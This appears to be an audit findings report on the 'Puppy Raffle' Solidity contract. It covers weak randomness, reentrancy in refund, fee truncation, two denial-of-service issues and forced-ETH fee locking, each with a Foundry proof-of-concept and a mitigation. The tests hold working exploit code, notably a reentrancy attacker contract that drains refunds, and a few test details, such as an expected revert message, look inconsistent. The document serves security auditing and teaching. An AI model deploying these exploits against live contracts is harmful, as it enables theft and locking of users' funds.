# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol
Puppy Raffle is an on-chain game where users buy raffle tickets to win a randomly generated “puppy” NFT and a share of the ether pot.

1. **Enter** – Anyone calls `enterRaffle(address[] newPlayers)` supplying an array of participant addresses and `msg.value == entranceFee * newPlayers.length`. Duplicate addresses are rejected and the list is stored in `players`.
2. **Refund** – A participant can leave before the draw via `refund(index)`, receiving their ticket price back. Only the original player can claim their refund; their slot in `players` is then deleted.
3. **Draw** – After the configurable `duration` has elapsed and at least four players remain, anyone may call `selectWinner()`. A pseudo-random index is picked, the winner receives 80 % of the contract balance, and a Puppy NFT (ERC-721) with rarity-based metadata is minted to them. The remaining 20 % is earmarked as protocol fees.
4. **Fee withdrawal** – Once no active players remain, the owner can send accumulated fees to `feeAddress` with `withdrawFees()`. The owner alone may change `feeAddress`, but cannot touch player funds.

All logic is covered by extensive Foundry tests and a deployment script, ensuring secure, reproducible launches.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-4]. DOS issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle
[M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees


### Number of Findings
- C: 0
- H: 4
- M: 2
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The winner selection and NFT rarity determination in `selectWinner` depend on predictable, on-chain data: `msg.sender`, `block.timestamp`, and `block.difficulty` (which is `PREVRANDAO` post-Merge). A malicious actor, especially a miner or validator, can predict the outcome of the raffle. They can choose to call `selectWinner` only when the block conditions are favorable for them to win. This undermines the fairness and randomness of the raffle.

## Impact
Because the caller of selectWinner() is included in the pseudo-random seed, any participant can deterministically search for—or a block producer can simply set—a block.timestamp that makes himself the winner. He then calls selectWinner() and siphons 80 % of the entire pot, leaving honest players with a guaranteed loss of their entrance fees. This constitutes direct theft of user funds and a complete breakdown of raffle fairness.

## Proof of Concept
1. A miner is participating in the raffle.
2. Other users submit transactions to call `selectWinner`.
3. The miner sees these transactions in the mempool.
4. For each transaction, the miner can calculate the outcome using the `msg.sender` from the transaction and the `block.timestamp` and `block.difficulty` of the block they are proposing.
5. If the outcome makes the miner the winner, they include the transaction. If it makes someone else the winner, they can ignore the transaction and instead insert their own `selectWinner` call into the block to try to win themselves. This gives them immense control over who wins the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Local interface – avoids pragma clash with the original ^0.7.6 contract
interface IPuppyRaffle {
    function enterRaffle(address[] calldata) external payable;
    function selectWinner() external;
    function previousWinner() external view returns (address);
    function entranceFee() external view returns (uint256);
}

contract PredictableWinner {
    IPuppyRaffle public raffle;
    constructor(IPuppyRaffle _raffle) { raffle = _raffle; }
    function attack() external {
        raffle.selectWinner();
    }
}

contract RandomnessExploitTest is Test {
    IPuppyRaffle raffle;
    PredictableWinner attacker;

    function setUp() public {
        // deploy the original contract with solc-0.7.6 via ffi (compile-time) or copy-paste bytecode
        // For brevity we assume it is already deployed at address(0xA).
        raffle = IPuppyRaffle(address(0xA));

        attacker = new PredictableWinner(raffle);

        // attacker, Alice, Bob, Carol buy tickets
        address[4] memory players = [address(attacker), address(0xB), address(0xC), address(0xD)];
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        raffle.enterRaffle{value: raffle.entranceFee() * players.length}(players);

        // fast-forward so raffle can be drawn
        vm.warp(block.timestamp + 2);
    }

    function testPredictableRandomness() public {
        // find a future timestamp that makes the attacker win
        uint256 ts = block.timestamp;
        while (true) {
            uint256 idx = uint256(keccak256(abi.encodePacked(address(attacker), ts, block.difficulty))) % 4;
            if (idx == 0) break; // players[0] == attacker
            ts += 1;
        }
        vm.warp(ts);
        vm.prank(address(attacker));
        attacker.attack();

        assertEq(raffle.previousWinner(), address(attacker));
    }
}

## Suggested Mitigation
Replace the on-chain hash-based RNG with an un-biased, externally verifiable source such as Chainlink VRF (or another commit-reveal / beacon-based scheme). The random value must be generated in a transaction that is not directly callable by players, and winner/rarity calculation should only use that unpredictable random value (never msg.sender, time, or difficulty).

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to the player *before* updating their state in the `players` array. This violates the Checks-Effects-Interactions pattern. A malicious contract can re-enter the `refund` function from its `receive()` hook. Because `players[playerIndex]` has not yet been set to `address(0)`, the checks will pass again, allowing the attacker to claim multiple refunds for a single ticket, effectively draining funds from the contract.

## Impact
An attacker can drain funds from the raffle contract up to the total amount of ETH held by the contract. This leads to direct financial loss for other participants and the protocol.

## Proof of Concept
1. An attacker deploys a contract that enters the raffle.
2. The attacker's contract calls `refund()`.
3. The `PuppyRaffle` contract sends the `entranceFee` back to the attacker's contract.
4. The `receive()` function on the attacker's contract is triggered, which immediately calls `refund()` again with the same `playerIndex`.
5. Since the state `players[playerIndex] = address(0)` has not been executed yet, the `require(playerAddress != address(0), ...)` check passes.
6. The attacker receives another refund. This can be repeated until the transaction runs out of gas.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundAttacker {
    PuppyRaffle puppyRaffle;
    uint256 public playerIndex;
    uint256 public attackCount = 0;

    constructor(address _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
    }

    function setupAttack() external payable {
        address[] memory playersToEnter = new address[](1);
        playersToEnter[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(playersToEnter);
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
    }

    function attack() external {
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 5) { // Limit re-entrancy to avoid infinite gas loop
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    RefundAttacker attacker;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(0x1);
    uint256 raffleDuration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        attacker = new RefundAttacker(address(puppyRaffle));
    }

    function testRefundReentrancy() public {
        // Enter some other players to provide funds to steal
        address[] memory dummyPlayers = new address[](4);
        dummyPlayers[0] = address(0x100);
        dummyPlayers[1] = address(0x200);
        dummyPlayers[2] = address(0x300);
        dummyPlayers[3] = address(0x400);
        vm.deal(address(this), 4 * entranceFee);
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(dummyPlayers);

        // Attacker enters the raffle
        vm.deal(address(attacker), entranceFee);
        attacker.setupAttack{value: entranceFee}();

        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialContractBalance = address(puppyRaffle).balance;

        // Attacker starts the refund attack
        attacker.attack();

        uint256 finalAttackerBalance = address(attacker).balance;
        uint256 finalContractBalance = address(puppyRaffle).balance;

        console.log("Initial contract balance:", initialContractBalance);
        console.log("Final contract balance:", finalContractBalance);
        console.log("Attacker balance change:", finalAttackerBalance - initialAttackerBalance);

        // Attacker should have received much more than their single entranceFee
        assertTrue(finalAttackerBalance - initialAttackerBalance > entranceFee);
    }
}
```

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern. Update the state (`players[playerIndex] = address(0)`) *before* sending the ETH.

```solidity
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        // MITIGATION: Update state before external call
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
    }
```

## [H-3]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The `totalFees` state variable is of type `uint64`, while the `fee` calculated within `selectWinner` is a `uint256`. The line `totalFees = totalFees + uint64(fee);` performs a down-casting from `uint256` to `uint64`. In Solidity versions prior to 0.8.0, this cast truncates the value if `fee` exceeds the maximum value for `uint64` (`2**64 - 1`). If the raffle collects a large amount of funds, the calculated fee can easily surpass this limit, causing the `totalFees` to record a much smaller, incorrect amount and leading to a loss of protocol funds.

## Impact
Because the truncated value stored in `totalFees` is smaller than the real ether balance left in the contract, the equality check in `withdrawFees()` (`address(this).balance == totalFees`) will never pass once truncation or overflow occurs. Consequently **all protocol fees become permanently stuck in the contract** and can never be withdrawn, resulting in a permanent loss of protocol revenue.

## Proof of Concept
1. Set a high `entranceFee`, for example, `1 ether`.
2. Have enough players enter such that the total fees collected exceed `type(uint64).max`. For `entranceFee = 1 ether`, `type(uint64).max` is ~18.4 ETH. So, `18.4 / 0.2 = 92` players are needed for the fee to exceed the limit.
3. Call `selectWinner`.
4. The `fee` will be a large `uint256` value, but when added to `totalFees`, it will be truncated.
5. The value stored in `totalFees` will be significantly less than the actual 20% fee, leading to financial loss for the protocol.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Uint64TruncationTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xBEEF), RAFFLE_DURATION);
    }

    function testUint64TruncationLocksFees() public {
        uint256 playerCount = 100; // enough to push fee over 2**64-1
        vm.deal(address(this), playerCount * ENTRANCE_FEE);

        // build unique player list
        address[] memory addrs = new address[](playerCount);
        for (uint256 i = 0; i < playerCount; i++) {
            addrs[i] = address(uint160(i + 1));
        }

        raffle.enterRaffle{value: playerCount * ENTRANCE_FEE}(addrs);

        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
        raffle.selectWinner();

        uint256 expectedFee = (playerCount * ENTRANCE_FEE * 20) / 100; // 20 ether
        uint256 storedFee   = raffle.totalFees();

        assertLt(storedFee, expectedFee, "fee should be truncated");
        assertEq(address(raffle).balance, expectedFee, "contract keeps full fee balance");

        // Withdrawal must revert because balance != storedFee
        vm.expectRevert();
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Store `totalFees` as `uint256` (or, equivalently, avoid any down-cast) and perform the addition directly in 256-bit space:

```solidity
uint256 public totalFees; // no need for uint64
...
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees += fee;
```

## [H-4]. DOS issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the prize is sent to the winner via `winner.call{value: prizePool}("")`. If the selected winner is a contract that does not have a payable `fallback` or `receive` function, or one that intentionally reverts upon receiving ETH, the `.call` will fail. This will cause the entire `selectWinner` transaction to revert. An attacker can enter the raffle with such a contract. If they are selected as the winner, they can prevent the raffle from concluding for that round, causing a temporary denial of service.

## Impact
If every remaining player address is a contract that reverts on receiving ETH, `selectWinner()` will *always* revert because the push transfer to the chosen winner fails and the `require(success)` statement bubbles the error. No state-changes are persisted, so the players array is never cleared and the raffle cannot advance to a new round. Refunds are impossible without the colluding players’ cooperation, and `withdrawFees()` is blocked because active players still exist. Consequently **all ETH in the contract (prize pool + accumulated fees) becomes permanently locked and the raffle is bricked forever**. This is a direct loss of user funds and protocol revenue.

## Proof of Concept
1. Attacker deploys 4 contracts, each of which reverts in both `receive()` and `fallback()`.
2. They pass the 4 malicious addresses to `enterRaffle()` and pay `4 * entranceFee`.
3. After `raffleDuration` seconds anyone (or the attacker) calls `selectWinner()`.
4. No matter which index is chosen, it points to a reverting address, the low-level `.call` fails, the `require(success)` triggers, and the whole tx reverts.
5. Because the transaction reverts, `players` is *not* cleared. Any subsequent attempt to call `selectWinner()` will hit the exact same condition and revert again, fully locking the raffle and all ETH inside it.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

// Malicious contract that rejects any ETH
contract RevertingReceiver {
    fallback() external payable { revert("NO"); }
    receive() external payable { revert("NO"); }
}

contract PuppyRaffle_DosTest is Test {
    PuppyRaffle raffle;
    uint256 fee = 1 ether;
    uint256 duration = 1; // 1 second for test

    function setUp() public {
        raffle = new PuppyRaffle(fee, address(0xFEE), duration);
    }

    function testPermanentDos() public {
        // Deploy 4 reverting receivers
        address[] memory bad = new address[](4);
        for (uint i; i < 4; i++) {
            bad[i] = address(new RevertingReceiver());
        }

        // Fund this test contract so it can pay the entrance fees
        vm.deal(address(this), 4 * fee);
        raffle.enterRaffle{value: 4 * fee}(bad);

        // Wait for raffle to finish
        vm.warp(block.timestamp + duration + 1);

        // Any attempt to pick a winner reverts deterministically
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();

        // Contract balance is still locked
        assertEq(address(raffle).balance, 4 * fee, "ETH should be stuck");
    }
}

## Suggested Mitigation
Adopt a pull over push model: store the winner and prize amount, reset raffle state (delete players, set `raffleStartTime`) and let the winner call `claimPrize()` to withdraw. Alternatively, keep the push transfer but wrap it in a `try/catch`; if it fails, *remove that address from the players array and draw a new winner* until the transfer succeeds. Either approach guarantees the raffle can always conclude and prevents permanent locking of funds.



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players using a nested loop. This algorithm has a time complexity of O(n^2), where n is the total number of players. As the `players` array grows, the gas cost of calling `enterRaffle` increases quadratically. An attacker can exploit this by entering a large number of unique addresses, making subsequent calls to `enterRaffle` prohibitively expensive for other users, effectively causing a denial of service.

## Impact
The raffle can be rendered unusable as new participants will be unable to enter due to excessively high gas costs or transactions hitting the block gas limit. This halts the primary function of the contract.

## Proof of Concept
1. An attacker calls `enterRaffle` with a large array of unique addresses (e.g., 200 addresses).
2. A legitimate user then tries to call `enterRaffle` to enter themselves.
3. The transaction for the legitimate user will require a massive amount of gas to execute the O(n^2) duplicate check, likely causing it to fail by running out of gas.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasDoSTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(0x1);
    uint256 raffleDuration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
    }

    function testEnterRaffleGasDos() public {
        // Attacker enters a large number of players
        uint256 initialPlayerCount = 150;
        address[] memory initialPlayers = new address[](initialPlayerCount);
        for (uint256 i = 0; i < initialPlayerCount; i++) {
            initialPlayers[i] = address(uint160(i + 1)); // Unique addresses
        }
        puppyRaffle.enterRaffle{value: entranceFee * initialPlayerCount}(initialPlayers);

        // Measure gas for entering one more player
        address[] memory singlePlayer = new address[](1);
        singlePlayer[0] = address(uint160(initialPlayerCount + 1));

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        uint256 gasUsed = gasStart - gasleft();

        console.log("Gas used to enter 1 player after", initialPlayerCount, "exist:", gasUsed);

        // Now, a legitimate user tries to enter after even more players have joined
        uint256 secondPlayerCount = 150;
        address[] memory secondPlayers = new address[](secondPlayerCount);
        for (uint256 i = 0; i < secondPlayerCount; i++) {
            secondPlayers[i] = address(uint160(i + initialPlayerCount + 2));
        }
        puppyRaffle.enterRaffle{value: entranceFee * secondPlayerCount}(secondPlayers);

        // This call will be much more expensive
        address[] memory finalPlayer = new address[](1);
        finalPlayer[0] = address(uint160(initialPlayerCount + secondPlayerCount + 2));

        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(finalPlayer);
        uint256 gasUsed2 = gasStart2 - gasleft();

        console.log("Gas used to enter 1 player after", initialPlayerCount + secondPlayerCount, "exist:", gasUsed2);

        // The gas cost grows quadratically, making it very expensive.
        assertTrue(gasUsed2 > gasUsed * 2, "Gas cost should increase significantly");
    }
}
```

## Suggested Mitigation
The duplicate check logic is inefficient. Instead of checking all existing players against each other on every entry, a more optimal approach should be used. A mapping can track if a player has already entered, providing O(1) lookup time.

```solidity
    // Add a mapping to track entrants
    mapping(address => bool) public isPlayer;

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            address player = newPlayers[i];
            // Check for duplicates efficiently
            require(!isPlayer[player], "PuppyRaffle: Duplicate player");
            players.push(player);
            isPlayer[player] = true;
        }
        emit RaffleEnter(newPlayers);
    }

    // Remember to reset the `isPlayer` mapping when the raffle resets in `selectWinner`
    // and when a player gets a refund.
```

## [M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function contains a strict equality check: `require(address(this).balance == uint256(totalFees), ...)`. This check assumes that the only funds held by the contract are the accumulated fees. However, ETH can be forcibly sent to any contract address by using `selfdestruct`. If any amount of ETH, even 1 wei, is sent to the `PuppyRaffle` contract this way, the balance check will permanently fail, as `address(this).balance` will be greater than `totalFees`. This will lock all accumulated fees in the contract forever.

## Impact
All protocol fees can be permanently and irrevocably locked within the contract. The owner will never be able to withdraw them, resulting in a total loss of protocol revenue.

## Proof of Concept
1. A raffle is completed, and fees are accumulated in `totalFees`.
2. An attacker (or anyone) creates a contract with a small amount of ETH and calls `selfdestruct(payable(address(puppyRaffle)))`.
3. The ETH is forcibly transferred to the `PuppyRaffle` contract.
4. The owner calls `withdrawFees()`.
5. The check `address(this).balance == uint256(totalFees)` now fails because the balance is higher than the fees.
6. The transaction reverts, and subsequent calls will also revert, permanently locking the funds.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract SelfDestructor {
    function destroyAndSend(address payable recipient) public payable {
        selfdestruct(recipient);
    }
}

contract FeeLockTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = makeAddr("fee_collector");
    uint256 raffleDuration = 1;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
    }

    function testFeesCanBePermanentlyLocked() public {
        // 1. Complete a raffle to generate fees.
        uint256 playerCount = 5;
        address[] memory players = new address[](playerCount);
        for (uint i = 0; i < playerCount; i++) {
            players[i] = address(uint160(i + 1));
        }
        vm.deal(address(this), playerCount * entranceFee);
        puppyRaffle.enterRaffle{value: playerCount * entranceFee}(players);
        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();

        assertTrue(puppyRaffle.totalFees() > 0, "Fees should have been generated");

        // 2. Attacker forcibly sends 1 wei via selfdestruct.
        SelfDestructor destructor = new SelfDestructor();
        destructor.destroyAndSend{value: 1 wei}(payable(address(puppyRaffle)));

        assertTrue(address(puppyRaffle).balance > uint256(puppyRaffle.totalFees()), "Balance should be greater than fees");

        // 3. withdrawFees will now revert.
        vm.prank(puppyRaffle.owner());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
The balance check in `withdrawFees` should be less strict. Instead of checking for exact equality, it should check that the contract's balance is greater than or equal to the fees to be withdrawn. This allows for withdrawal even if extra ETH has been sent to the contract.

```solidity
    function withdrawFees() external {
        // MITIGATION: Use a less strict check to prevent locking funds.
        require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Not enough balance to withdraw fees");
        require(totalFees > 0, "PuppyRaffle: No fees to withdraw");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```



